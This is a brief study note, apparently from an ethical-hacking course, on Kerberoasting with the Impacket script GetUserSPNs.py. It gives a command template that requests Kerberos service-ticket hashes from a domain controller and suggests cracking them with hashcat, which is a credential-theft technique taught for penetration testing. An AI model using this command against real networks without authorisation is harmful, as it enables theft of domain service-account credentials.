GetUserSPNs.py
---------------
from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course ; "Kerberoasting Overview" ; https://academy.tcm-sec.com/courses/1152300/lectures/48493804
$ python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip_of_DC> -request
- this will dump the Kerberos hash from the DC which you will then attempt to crack (e.g. using hashcat)
